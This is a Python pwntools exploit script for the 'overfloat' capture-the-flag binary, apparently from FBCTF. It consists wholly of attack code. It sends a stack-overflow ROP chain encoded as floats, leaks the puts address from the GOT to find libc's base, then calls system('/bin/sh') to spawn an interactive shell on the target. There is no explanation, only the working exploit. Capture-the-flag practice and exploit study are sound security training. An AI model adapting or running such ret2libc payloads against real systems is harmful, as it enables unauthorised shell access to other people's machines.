#!/usr/bin/env python
from pwn import *
import struct

if len(sys.argv) == 1:
    s = process('./overfloat')
else:
    s = remote('challenges.fbctf.com', 1341)

libc = ELF('./libc-2.27.so')
elf = ELF('./overfloat')

ret = 0x400661
pop_rdi = 0x400a83

payload = ''
payload += 'A' * 0x38
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

for i in range(len(payload) // 4):
    s.sendlineafter(': ', str(struct.unpack('f', payload[i*4:(i+1)*4])[0]))
s.sendlineafter(': ', 'done')

s.recvline()
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

payload = ''
payload += 'A' * 0x38
payload += p64(ret)
payload += p64(pop_rdi) + p64(libc_base + libc.search('/bin/sh\0').next())
payload += p64(libc_base + libc.symbols['system'])

for i in range(len(payload) // 4):
    s.sendlineafter(': ', str(struct.unpack('f', payload[i*4:(i+1)*4])[0]))
s.sendlineafter(': ', 'done')

s.interactive()
